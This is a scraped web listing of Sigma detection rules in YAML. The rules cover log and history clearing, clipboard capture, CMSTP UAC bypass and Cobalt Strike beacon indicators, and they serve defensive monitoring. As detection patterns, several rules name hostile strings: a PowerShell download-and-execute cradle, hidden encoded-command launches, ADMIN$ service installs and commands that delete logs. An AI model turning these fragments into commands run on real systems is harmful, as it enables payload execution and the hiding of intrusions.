<li><a href="#">title:Clear Linux Logs id: 80915f59-9b56-4616-9de0-fd0dea6c12fe status: stable description: Detects clear logs author: Ã–mer GÃ¼nal, oscd.community date: 2020/10/07 references: - logsource: product: linux category: process_creation detection: selection: Image|endswith: - '/rm' # covers /rmdir as well - '/shred' CommandLine|contains: - '/var/log' - '/var/spool/mail' condition: selection falsepositives: - Legitimate administration activities level: medium tags: - attack.defense_evasion - attack.t1070.002 
<li><a href="#">title:Clear PowerShell History id: 26b692dc-1722-49b2-b496-a8258aa6371d related: - id: dfba4ce1-e0ea-495f-986e-97140f31af2d type: derived status: experimental description: Detects keywords that could indicate clearing PowerShell history author: Ilyas Ochkov, Jonhnathan Ribeiro, Daniil Yugoslavskiy, oscd.community references: - date: 2022/01/25 modified: 2022/05/10 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection1a: ScriptBlockText|contains: - 'del' - 'Remove-Item' - 'rm' selection1b: ScriptBlockText|contains: '(Get-PSReadlineOption).HistorySavePath' selection_2: ScriptBlockText|contains|all: - 'Set-PSReadlineOption' - 'â€“HistorySaveStyle' # not sure if the homoglyph â€“/- is intended, just checking for both - 'SaveNothing' selection_3: ScriptBlockText|contains|all: - 'Set-PSReadlineOption' - '-HistorySaveStyle' - 'SaveNothing' condition: 1 of selection_* or all of selection1* falsepositives: - Legitimate PowerShell scripts level: medium tags: - attack.defense_evasion - attack.t1070.003 
<li><a href="#">title:Clear PowerShell History id: f99276ad-d122-4989-a09a-d00904a5f9d2 related: - id: dfba4ce1-e0ea-495f-986e-97140f31af2d type: derived status: experimental description: Detects keywords that could indicate clearing PowerShell history date: 2019/10/25 modified: 2022/05/10 author: Ilyas Ochkov, Jonhnathan Ribeiro, Daniil Yugoslavskiy, oscd.community references: - tags: - attack.defense_evasion - attack.t1070.003 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection_1a_payload: Payload|contains: - 'del' - 'Remove-Item' - 'rm' selection_1b_payload: Payload|contains: '(Get-PSReadlineOption).HistorySavePath' selection_payload_2: Payload|contains|all: - 'Set-PSReadlineOption' - 'â€“HistorySaveStyle' # not sure if the homoglyph â€“/- is intended, just checking for both - 'SaveNothing' selection_payload_3: Payload|contains|all: - 'Set-PSReadlineOption' - '-HistorySaveStyle' - 'SaveNothing' condition: 1 of selection_payload_* or all of selection_1* falsepositives: - Legitimate PowerShell scripts level: medium 
<li><a href="#">title:Clearing Windows Console History id: bde47d4b-9987-405c-94c7-b080410e8ea7 description: Identifies when a user attempts to clear console history. An adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. status: experimental author: Austin Songer @austinsonger date: 2021/11/25 references: - - - logsource: product: windows category: ps_script detection: selection1: ScriptBlockText|contains: Clear-History selection2a: ScriptBlockText|contains: - Remove-Item - rm selection2b: ScriptBlockText|contains: - ConsoleHost_history.txt - (Get-PSReadlineOption).HistorySavePath condition: selection1 or selection2a and selection2b tags: - attack.defense_evasion - attack.t1070 - attack.t1070.003 level: high falsepositives: - Unknown 
<li><a href="#">title:Cleartext Protocol Usage id: 7e4bfe58-4a47-4709-828d-d86c78b7cc1f status: stable description: Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels. Ensure that an encryption is used for all sensitive information in transit. Ensure that an encrypted channels is used for all administrative account access. author: Alexandr Yampolskyi, SOC Prime date: 2019/03/26 references: - - - # tags: # - CSC4 # - CSC4.5 # - CSC14 # - CSC14.4 # - CSC16 # - CSC16.5 # - NIST CSF 1.1 PR.AT-2 # - NIST CSF 1.1 PR.MA-2 # - NIST CSF 1.1 PR.PT-3 # - NIST CSF 1.1 PR.AC-1 # - NIST CSF 1.1 PR.AC-4 # - NIST CSF 1.1 PR.AC-5 # - NIST CSF 1.1 PR.AC-6 # - NIST CSF 1.1 PR.AC-7 # - NIST CSF 1.1 PR.DS-1 # - NIST CSF 1.1 PR.DS-2 # - ISO 27002-2013 A.9.2.1 # - ISO 27002-2013 A.9.2.2 # - ISO 27002-2013 A.9.2.3 # - ISO 27002-2013 A.9.2.4 # - ISO 27002-2013 A.9.2.5 # - ISO 27002-2013 A.9.2.6 # - ISO 27002-2013 A.9.3.1 # - ISO 27002-2013 A.9.4.1 # - ISO 27002-2013 A.9.4.2 # - ISO 27002-2013 A.9.4.3 # - ISO 27002-2013 A.9.4.4 # - ISO 27002-2013 A.8.3.1 # - ISO 27002-2013 A.9.1.1 # - ISO 27002-2013 A.10.1.1 # - PCI DSS 3.2 2.1 # - PCI DSS 3.2 8.1 # - PCI DSS 3.2 8.2 # - PCI DSS 3.2 8.3 # - PCI DSS 3.2 8.7 # - PCI DSS 3.2 8.8 # - PCI DSS 3.2 1.3 # - PCI DSS 3.2 1.4 # - PCI DSS 3.2 4.3 # - PCI DSS 3.2 7.1 # - PCI DSS 3.2 7.2 # - PCI DSS 3.2 7.3 logsource: service: netflow detection: selection: destination.port: - 8080 - 21 - 80 - 23 - 50000 - 1521 - 27017 - 1433 - 11211 - 3306 - 15672 - 5900 - 5901 - 5902 - 5903 - 5904 condition: selection falsepositives: - Unknown level: low 
<li><a href="#">title:Cleartext Protocol Usage id: d7fb8f0e-bd5f-45c2-b467-19571c490d7e status: stable description: Ensure that all account usernames and authentication credentials are transmitted across networks using encrypted channels. Ensure that an encryption is used for all sensitive information in transit. Ensure that an encrypted channels is used for all administrative account access. author: Alexandr Yampolskyi, SOC Prime date: 2019/03/26 modified: 2021/11/23 references: - - - logsource: category: firewall detection: selection1: dst_port: - 8080 - 21 - 80 - 23 - 50000 - 1521 - 27017 - 3306 - 1433 - 11211 - 15672 - 5900 - 5901 - 5902 - 5903 - 5904 selection2: action: - forward - accept - 2 condition: selection1 and selection2 falsepositives: - Unknown level: low # tags: # - CSC4 # - CSC4.5 # - CSC14 # - CSC14.4 # - CSC16 # - CSC16.5 # - NIST CSF 1.1 PR.AT-2 # - NIST CSF 1.1 PR.MA-2 # - NIST CSF 1.1 PR.PT-3 # - NIST CSF 1.1 PR.AC-1 # - NIST CSF 1.1 PR.AC-4 # - NIST CSF 1.1 PR.AC-5 # - NIST CSF 1.1 PR.AC-6 # - NIST CSF 1.1 PR.AC-7 # - NIST CSF 1.1 PR.DS-1 # - NIST CSF 1.1 PR.DS-2 # - ISO 27002-2013 A.9.2.1 # - ISO 27002-2013 A.9.2.2 # - ISO 27002-2013 A.9.2.3 # - ISO 27002-2013 A.9.2.4 # - ISO 27002-2013 A.9.2.5 # - ISO 27002-2013 A.9.2.6 # - ISO 27002-2013 A.9.3.1 # - ISO 27002-2013 A.9.4.1 # - ISO 27002-2013 A.9.4.2 # - ISO 27002-2013 A.9.4.3 # - ISO 27002-2013 A.9.4.4 # - ISO 27002-2013 A.8.3.1 # - ISO 27002-2013 A.9.1.1 # - ISO 27002-2013 A.10.1.1 # - PCI DSS 3.2 2.1 # - PCI DSS 3.2 8.1 # - PCI DSS 3.2 8.2 # - PCI DSS 3.2 8.3 # - PCI DSS 3.2 8.7 # - PCI DSS 3.2 8.8 # - PCI DSS 3.2 1.3 # - PCI DSS 3.2 1.4 # - PCI DSS 3.2 4.3 # - PCI DSS 3.2 7.1 # - PCI DSS 3.2 7.2 # - PCI DSS 3.2 7.3 
<li><a href="#">title:Clipboard Collection of Image Data with Xclip Tool id: f200dc3f-b219-425d-a17e-c38467364816 description: Detects attempts to collect image data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed. Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations. author: 'Pawel Mazur' status: experimental date: 2021/10/01 references: - - logsource: product: linux service: auditd detection: selection: type: EXECVE a0: xclip a1: - '-selection' - '-sel' a2: - clipboard - clip a3: '-t' a4|startswith: 'image/' a5: '-o' condition: selection tags: - attack.collection - attack.t1115 falsepositives: - Legitimate usage of xclip tools level: low 
<li><a href="#">title:Clipboard Collection with Xclip Tool id: 214e7e6c-f21b-47ff-bb6f-551b2d143fcf description: Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed. Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations. author: 'Pawel Mazur' status: experimental date: 2021/09/24 references: - - - logsource: product: linux service: auditd detection: selection: type: EXECVE a0: xclip a1: - '-selection' - '-sel' a2: - clipboard - clip a3: '-o' condition: selection tags: - attack.collection - attack.t1115 falsepositives: - Legitimate usage of xclip tools level: low 
<li><a href="#">title:Clipboard Collection with Xclip Tool id: ec127035-a636-4b9a-8555-0efd4e59f316 status: experimental description: Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed. Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations. date: 2021/10/15 author: Pawel Mazur, Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.impact - attack.t1485 references: - logsource: product: linux category: process_creation detection: selection1: Image|contains: 'xclip' selection2: CommandLine|contains: - '-selection' - '-sel' selection3: CommandLine|contains: - 'clipboard' - 'clip' selection4: CommandLine|contains: '-o' condition: selection1 and selection2 and selection3 and selection4 falsepositives: - Legitimate usage of xclip tools. level: low 
<li><a href="#">title:CLR DLL Loaded Via Office Applications id: d13c43f0-f66b-4279-8b2c-5912077c1780 status: test description: Detects CLR DLL being loaded by an Office Product author: Antonlovesdnb references: - date: 2020/02/19 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - '\winword.exe' - '\powerpnt.exe' - '\excel.exe' - '\outlook.exe' ImageLoaded|contains: '\clr.dll' condition: selection falsepositives: - Alerts on legitimate macro usage as well, will need to filter as appropriate level: high tags: - attack.execution - attack.t1204.002 
<li><a href="#">title:CLR DLL Loaded Via Scripting Applications id: 4508a70e-97ef-4300-b62b-ff27992990ea status: test description: Detects CLR DLL being loaded by an scripting applications author: omkar72, oscd.community references: - - - date: 2020/10/14 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: - '\wscript.exe' - '\cscript.exe' - '\mshta.exe' ImageLoaded|endswith: - '\clr.dll' - '\mscoree.dll' - '\mscorlib.dll' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.privilege_escalation - attack.t1055 
<li><a href="#">title:Cmd Stream Redirection id: 70e68156-6571-427b-a6e9-4476a173a9b6 status: experimental description: Detects the redirection of an output stream of / within a Windows command line session author: frack113 references: - date: 2022/02/04 logsource: category: process_creation product: windows detection: selection: Image|endswith: \cmd.exe CommandLine|contains: '>*:' condition: selection falsepositives: - Unknown level: low tags: - attack.defense_evasion - attack.t1564.004 
<li><a href="#">title:Cmd.exe CommandLine Path Traversal id: 087790e3-3287-436c-bccf-cbd0184a7db1 status: test description: detects the usage of path traversal in cmd.exe indicating possible command/argument confusion/hijacking author: xknow @xknow_infosec, Tim Shelton references: - - date: 2020/06/11 modified: 2022/03/17 logsource: category: process_creation product: windows detection: selection: ParentCommandLine|contains|all: - 'cmd' - '/c' CommandLine|contains: '/../../' falsepositive_1: CommandLine|contains: '\Tasktop\keycloak\bin\/../../jre\bin\java' condition: selection and not 1 of falsepositive* falsepositives: - (not much) some benign Java tools may product false-positive commandlines for loading libraries level: high tags: - attack.execution - attack.t1059.003 
<li><a href="#">title:Cmdkey Cached Credentials Recon id: 07f8bdc2-c9b3-472a-9817-5a670b872f53 status: experimental description: Detects usage of cmdkey to look for cached credentials references: - - (v=ws.11).aspx author: jmallette, Florian Roth, Nasreddine Bencherchali (update) date: 2019/01/16 modified: 2022/06/11 tags: - attack.credential_access - attack.t1003.005 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\cmdkey.exe' - OriginalFileName: 'cmdkey.exe' selection_cli: CommandLine|contains: - ' /l' - ' -l' condition: all of selection* fields: - CommandLine - ParentCommandLine - User falsepositives: - Legitimate administrative tasks level: high 
<li><a href="#">title:CMSTP Execution Process Access id: 3b4b232a-af90-427c-a22f-30b0c0837b95 status: stable description: Detects various indicators of Microsoft Connection Manager Profile Installer execution tags: - attack.defense_evasion - attack.t1218.003 - attack.execution - attack.t1559.001 - attack.g0069 - attack.g0080 - car.2019-04-001 author: Nik Seetharaman date: 2018/07/16 modified: 2021/06/27 references: - fields: - CommandLine - ParentCommandLine - Details falsepositives: - Legitimate CMSTP use (unlikely in modern enterprise environments) level: high logsource: product: windows category: process_access detection: # Process Access Call Trace selection: CallTrace|contains: 'cmlua.dll' condition: selection 
<li><a href="#">title:CMSTP Execution Process Creation id: 7d4cdc5a-0076-40ca-aac8-f7e714570e47 status: stable description: Detects various indicators of Microsoft Connection Manager Profile Installer execution references: - author: Nik Seetharaman date: 2018/07/16 modified: 2020/12/23 logsource: category: process_creation product: windows detection: # CMSTP Spawning Child Process selection: ParentImage|endswith: '\cmstp.exe' condition: selection fields: - CommandLine - ParentCommandLine - Details falsepositives: - Legitimate CMSTP use (unlikely in modern enterprise environments) level: high tags: - attack.defense_evasion - attack.execution - attack.t1218.003 - attack.g0069 - car.2019-04-001 
<li><a href="#">title:CMSTP Execution Registry Event id: b6d235fc-1d38-4b12-adbe-325f06728f37 status: stable description: Detects various indicators of Microsoft Connection Manager Profile Installer execution author: Nik Seetharaman date: 2018/07/16 modified: 2020/12/23 references: - fields: - CommandLine - ParentCommandLine - Details falsepositives: - Legitimate CMSTP use (unlikely in modern enterprise environments) level: high logsource: category: registry_event product: windows detection: selection: TargetObject|contains: '\cmmgr32.exe' condition: selection tags: - attack.defense_evasion - attack.execution - attack.t1218.003 - attack.g0069 - car.2019-04-001 
<li><a href="#">title:CMSTP UAC Bypass via COM Object Access id: 4b60e6f2-bf39-47b4-b4ea-398e33cfe253 status: stable description: Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects (e.g. UACMe ID of 41, 43, 58 or 65) tags: - attack.execution - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 - attack.t1218.003 - attack.g0069 - car.2019-04-001 author: Nik Seetharaman, Christian Burkard date: 2019/07/31 modified: 2021/08/31 references: - - - - logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\DllHost.exe' IntegrityLevel: - 'High' - 'System' ParentCommandLine|contains: - ' /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}' - ' /Processid:{3E000D72-A845-4CD9-BD83-80C07C3B881F}' - ' /Processid:{BD54C901-076B-434E-B6C7-17C531F4AB41}' - ' /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}' - ' /Processid:{E9495B87-D950-4AB5-87A5-FF6D70BF3E90}' condition: selection fields: - CommandLine - ParentCommandLine - Hashes falsepositives: - Legitimate CMSTP use (unlikely in modern enterprise environments) level: high 
<li><a href="#">title:Cobalt Strike DNS Beaconing id: 2975af79-28c4-4d2f-a951-9095f229df29 status: experimental description: Detects suspicious DNS queries known from Cobalt Strike beacons author: Florian Roth date: 2018/05/10 modified: 2021/03/24 references: - - logsource: category: dns detection: selection1: query|startswith: - 'aaa.stage.' - 'post.1' selection2: query|contains: '.stage.123456.' condition: 1 of selection* falsepositives: - Unknown level: critical tags: - attack.command_and_control - attack.t1071.004 
<li><a href="#">title:CobaltStrike BOF Injection Pattern id: 09706624-b7f6-455d-9d02-adee024cee1d description: Detects a typical pattern of a CobaltStrike BOF which inject into other processes references: - - status: experimental author: Christian Burkard date: 2021/08/04 logsource: category: process_access product: windows detection: selection: CallTrace|re: '^C:\\\\Windows\\\\SYSTEM32\\\\ntdll\\.dll\+[a-z0-9]{4,6}\|C:\\\\Windows\\\\System32\\\\KERNELBASE\\.dll\+[a-z0-9]{4,6}\|UNKNOWN\([A-Z0-9]{16}\)$' GrantedAccess: - '0x1028' - '0x1fffff' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1106 - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:CobaltStrike Load by Rundll32 status: test id: ae9c6a7c-9521-42a6-915e-5aaa8689d529 author: Wojciech Lesicki date: 2021/06/01 modified: 2022/03/04 description: Rundll32 can be use by Cobalt Strike with StartW function to load DLLs from the command line. references: - - - tags: - attack.defense_evasion - attack.t1218.011 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'rundll32.exe' - '.dll' CommandLine|endswith: - ' StartW' - ',StartW' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:CobaltStrike Malformed UAs in Malleable Profiles id: 41b42a36-f62c-4c34-bd40-8cb804a34ad8 status: experimental description: Detects different malformed user agents used in Malleable Profiles used with Cobalt Strike author: Florian Roth date: 2021/05/06 modified: 2021/11/02 references: - logsource: category: proxy detection: selection1: c-useragent: - 'Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)' - 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E )' - 'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_08' selection2: c-useragent|endswith: '; MANM; MANM)' condition: 1 of selection* falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:CobaltStrike Malleable (OCSP) Profile id: 37325383-740a-403d-b1a2-b2b4ab7992e7 status: test description: Detects Malleable (OCSP) Profile with Typo (OSCP) in URL author: Markus Neis references: - date: 2019/11/12 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri|contains: '/oscp/' cs-host: 'ocsp.verisign.com' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:CobaltStrike Malleable Amazon Browsing Traffic Profile id: 953b895e-5cc9-454b-b183-7f3db555452e status: test description: Detects Malleable Amazon Profile author: Markus Neis references: - - date: 2019/11/12 modified: 2021/11/27 logsource: category: proxy detection: selection1: c-useragent: 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' cs-method: 'GET' c-uri: '/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books' cs-host: 'www.amazon.com' cs-cookie|endswith: '=csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996' selection2: c-useragent: 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' cs-method: 'POST' c-uri: '/N4215/adj/amzn.us.sr.aps' cs-host: 'www.amazon.com' condition: selection1 or selection2 falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:CobaltStrike Malleable OneDrive Browsing Traffic Profile id: c9b33401-cc6a-4cf6-83bb-57ddcb2407fc status: test description: Detects Malleable OneDrive Profile author: Markus Neis references: - date: 2019/11/12 modified: 2022/01/07 logsource: category: proxy detection: selection: cs-method: 'GET' c-uri|endswith: '?manifest=wac' cs-host: 'onedrive.live.com' filter: c-uri|startswith: 'http' c-uri|contains: '://onedrive.live.com/' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:CobaltStrike Named Pipe id: d5601f8c-b26f-4ab0-9035-69e11a8d4ad2 status: experimental description: Detects the creation of a named pipe as used by CobaltStrike references: - - - - date: 2021/05/25 author: Florian Roth, Wojciech Lesicki tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 logsource: product: windows category: pipe_created definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (), but it is worth verifying. You can also use other repo, e.g. , . How to test detection? You can always use Cobalt Strike, but also you can check powershell script from this site ' detection: selection_MSSE: PipeName|contains|all: - '\MSSE-' - '-server' selection_postex: PipeName|startswith: '\postex_' selection_postex_ssh: PipeName|startswith: '\postex_ssh_' selection_status: PipeName|startswith: '\status_' selection_msagent: PipeName|startswith: '\msagent_' condition: 1 of selection* falsepositives: - Unknown level: critical 
<li><a href="#">title:CobaltStrike Named Pipe Pattern Regex id: 0e7163d4-9e19-4fa7-9be6-000c61aad77a status: experimental description: Detects the creation of a named pipe matching a pattern used by CobaltStrike Malleable C2 profiles references: - - date: 2021/07/30 modified: 2021/09/02 author: Florian Roth tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 logsource: product: windows category: pipe_created definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (), but it is worth verifying. You can also use other repo, e.g. , You can also use other repo, e.g. , . How to test detection? You can always use Cobalt Strike, but also you can check powershell script from this site ' detection: selection: - PipeName|re: '\\\\mojo\.5688\.8052\.(?:183894939787088877|35780273329370473)[0-9a-f]{2}' - PipeName|re: '\\\\wkssvc_?[0-9a-f]{2}' - PipeName|re: '\\\\ntsvcs[0-9a-f]{2}' - PipeName|re: '\\\\DserNamePipe[0-9a-f]{2}' - PipeName|re: '\\\\SearchTextHarvester[0-9a-f]{2}' - PipeName|re: '\\\\mypipe\-(?:f|h)[0-9a-f]{2}' - PipeName|re: '\\\\windows\.update\.manager[0-9a-f]{2,3}' - PipeName|re: '\\\\ntsvcs_[0-9a-f]{2}' - PipeName|re: '\\\\scerpc_?[0-9a-f]{2}' - PipeName|re: '\\\\PGMessagePipe[0-9a-f]{2}' - PipeName|re: '\\\\MsFteWds[0-9a-f]{2}' - PipeName|re: '\\\\f4c3[0-9a-f]{2}' - PipeName|re: '\\\\fullduplex_[0-9a-f]{2}' - PipeName|re: '\\\\msrpc_[0-9a-f]{4}' - PipeName|re: '\\\\win\\\\msrpc_[0-9a-f]{2}' - PipeName|re: '\\\\f53f[0-9a-f]{2}' - PipeName|re: '\\\\rpc_[0-9a-f]{2}' - PipeName|re: '\\\\spoolss_[0-9a-f]{2}' - PipeName|re: '\\\\Winsock2\\\\CatalogChangeListener-[0-9a-f]{3}-0,' condition: selection falsepositives: - Unknown level: critical 
<li><a href="#">title:CobaltStrike Named Pipe Patterns id: 85adeb13-4fc9-4e68-8a4a-c7cb2c336eb7 status: experimental description: Detects the creation of a named pipe with a pattern found in CobaltStrike malleable C2 profiles references: - - date: 2021/07/30 modified: 2021/08/26 author: Florian Roth, Christian Burkard tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 logsource: product: windows category: pipe_created definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (), but it is worth verifying. You can also use other repo, e.g. , You can also use other repo, e.g. , . How to test detection? You can always use Cobalt Strike, but also you can check powershell script from this site ' detection: selection_malleable_profiles: - PipeName|startswith: - '\mojo.5688.8052.183894939787088877' - '\mojo.5688.8052.35780273329370473' - '\mypipe-f' - '\mypipe-h' - '\ntsvcs' - '\scerpc' - '\win_svc' - '\spoolss' - '\msrpc_' - '\win\msrpc_' - '\wkssvc' - '\f53f' - '\windows.update.manager' - '\SearchTextHarvester' - '\DserNamePipe' - '\PGMessagePipe' - '\MsFteWds' - '\f4c3' - '\fullduplex_' - '\rpc_' - PipeName: - '\demoagent_11' - '\demoagent_22' selection_malleable_profile_CatalogChangeListener: PipeName|startswith: '\Winsock2\CatalogChangeListener-' PipeName|endswith: '-0,' filter: PipeName: - '\wkssvc' - '\spoolss' - '\scerpc' - '\ntsvcs' - '\SearchTextHarvester' - '\PGMessagePipe' - '\MsFteWds' condition: 1 of selection_malleable_profile* and not filter falsepositives: - Chrome instances using the exactly same name pipe named mojo.something level: high 
<li><a href="#">title:CobaltStrike Process Injection id: 6309645e-122d-4c5b-bb2b-22e4f9c2fa42 description: Detects a possible remote threat creation with certain characteristics which are typical for Cobalt Strike beacons references: - - tags: - attack.defense_evasion - attack.t1055.001 status: experimental author: Olaf Hartong, Florian Roth, Aleksey Potapov, oscd.community date: 2018/11/30 modified: 2021/11/20 logsource: product: windows category: create_remote_thread detection: selection: StartAddress|endswith: - '0B80' - '0C7C' - '0C88' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:CobaltStrike Process Patterns id: f35c5d71-b489-4e22-a115-f003df287317 status: experimental description: Detects process patterns found in Cobalt Strike beacon activity (see reference for more details) and also cases in which a China Chopper like webshell is used to run whoami author: Florian Roth references: - - date: 2021/07/27 modified: 2022/03/05 tags: - attack.execution - attack.t1059 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: '\cmd.exe /C whoami' ParentImage|startswith: 'C:\Temp' selection2: CommandLine|contains: 'conhost.exe 0xffffffff -ForceV1' ParentCommandLine|contains: - '/C whoami' - 'cmd.exe /C echo' - ' > \\\\.\\pipe' selection3: CommandLine|contains: - 'cmd.exe /c echo' - '> \\\\.\\pipe' - '\whoami.exe' ParentImage|endswith: '\dllhost.exe' selection4: Image|endswith: '\cmd.exe' ParentImage|endswith: '\runonce.exe' ParentCommandLine|endswith: '\runonce.exe' condition: 1 of selection* falsepositives: - Other programs that cause these patterns (please report) level: high 
<li><a href="#">title:CobaltStrike Service Installations id: 5a105d34-05fc-401e-8553-272b45c1522d description: Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement status: experimental author: Florian Roth, Wojciech Lesicki references: - - - date: 2021/05/26 modified: 2021/09/30 tags: - attack.execution - attack.privilege_escalation - attack.lateral_movement - attack.t1021.002 - attack.t1543.003 - attack.t1569.002 logsource: product: windows service: system detection: selection_id: Provider_Name: 'Service Control Manager' EventID: 7045 selection1: ImagePath|contains|all: - 'ADMIN$' - '.exe' selection2: ImagePath|contains|all: - '%COMSPEC%' - 'start' - 'powershell' selection3: ImagePath|contains: 'powershell -nop -w hidden -encodedcommand' selection4: ImagePath|base64offset|contains: "IEX (New-Object Net.Webclient).DownloadString(':" condition: selection_id and (selection1 or selection2 or selection3 or selection4) falsepositives: - Unknown level: critical 
<li><a href="#">title:CobaltStrike Service Installations id: d7a95147-145f-4678-b85d-d1ff4a3bb3f6 related: - id: 5a105d34-05fc-401e-8553-272b45c1522d type: derived description: Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement status: experimental author: Florian Roth, Wojciech Lesicki references: - - - date: 2021/05/26 modified: 2021/09/21 tags: - attack.execution - attack.privilege_escalation - attack.lateral_movement - attack.t1021.002 - attack.t1543.003 - attack.t1569.002 logsource: product: windows service: security detection: event_id: EventID: 4697 selection1: ServiceFileName|contains|all: - 'ADMIN$' - '.exe' selection2: ServiceFileName|contains|all: - '%COMSPEC%' - 'start' - 'powershell' selection3: ServiceFileName|contains: 'powershell -nop -w hidden -encodedcommand' selection4: ServiceFileName|base64offset|contains: "IEX (New-Object Net.Webclient).DownloadString(':" condition: event_id and 1 of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:CobaltStrike Service Installations in Registry id: 61a7697c-cb79-42a8-a2ff-5f0cdfae0130 description: Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement. We can also catch this by system log 7045 () In some SIEM you can catch those events also in HKLM\System\ControlSet001\Services or HKLM\System\ControlSet002\Services, however, this rule is based on a regular sysmon's events. status: experimental date: 2021/06/29 modified: 2022/03/26 author: Wojciech Lesicki references: - logsource: category: registry_set product: windows detection: selection1: EventType: SetValue TargetObject|contains: 'HKLM\System\CurrentControlSet\Services' selection2: Details|contains|all: - 'ADMIN$' - '.exe' selection3: Details|contains|all: - '%COMSPEC%' - 'start' - 'powershell' condition: selection1 and (selection2 or selection3) falsepositives: - Unknown level: critical tags: - attack.execution - attack.privilege_escalation - attack.lateral_movement - attack.t1021.002 - attack.t1543.003 - attack.t1569.002 
<li><a href="#">title:Code Executed Via Office Add-in XLL File id: 36fbec91-fa1b-4d5d-8df1-8d8edcb632ad status: experimental description: | Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs references: - author: frack113 date: 2021/12/28 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - 'new-object ' - '-ComObject ' - '.application' - '.RegisterXLL' condition: selection falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1137.006 
<li><a href="#">title:Code Execution via Pcwutl.dll id: 9386d78a-7207-4048-9c9f-a93a7c2d1c05 status: test description: Detects launch of executable by calling the LaunchApplication function from pcwutl.dll library. author: Julia Fomina, oscd.community references: - - date: 2020/10/05 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\rundll32.exe' CommandLine|contains|all: - 'pcwutl' - 'LaunchApplication' condition: selection falsepositives: - Use of Program Compatibility Troubleshooter Helper level: medium tags: - attack.defense_evasion - attack.t1218.011 
<li><a href="#">title:Code Injection by ld.so Preload id: 7e3c4651-c347-40c4-b1d4-d48590fdf684 status: experimental description: Detects the ld.so preload persistence file. See `man ld.so` for more information. author: Christian Burkard date: 2021/05/05 references: - logsource: product: linux detection: keywords: - '/etc/ld.so.preload' condition: keywords falsepositives: - Rare temporary workaround for library misconfiguration level: high tags: - attack.persistence - attack.privilege_escalation - attack.t1574.006 
<li><a href="#">title:Code Integrity Blocked Driver Load id: f8931561-97f5-4c46-907f-0a4a592e47a7 description: Detects driver load events that got blocked by Windows code integrity checks author: Florian Roth status: experimental references: - date: 2022/01/20 tags: - attack.execution logsource: product: windows service: codeintegrity-operational detection: keywords: - 'that did not meet the Microsoft signing level requirements' condition: keywords falsepositives: - Unknown level: high 
<li><a href="#">title:COM Hijack via Sdclt id: 07743f65-7ec9-404a-a519-913db7118a8d status: test description: Detects changes to 'HKCU\Software\Classes\Folder\shell\open\command\DelegateExecute' author: Omkar Gudhate references: - - date: 2020/09/27 modified: 2022/06/26 logsource: category: registry_set product: windows detection: selection: EventType: Setvalue TargetObject: 'HKCU\Software\Classes\Folder\shell\open\command\DelegateExecute' condition: selection falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1546 - attack.t1548 
